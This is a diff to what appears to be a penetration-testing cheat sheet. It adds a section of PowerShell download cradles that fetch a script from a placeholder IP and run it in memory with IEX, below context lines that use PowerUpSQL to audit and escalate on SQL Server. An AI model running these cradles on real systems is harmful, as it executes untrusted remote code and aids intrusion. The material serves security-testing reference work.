@@ -246,3 +246,13 @@ Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"
 Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"
 ```
 
+# Download Cardles
+
+```
+# normal download cradle
+IEX (New-Object Net.Webclient).downloadstring("http://192.168.X.X/script.ps1")
+
+# PowerShell 3.0+
+IEX (iwr 'http://192.168.X.X/script.ps1')
+
+```
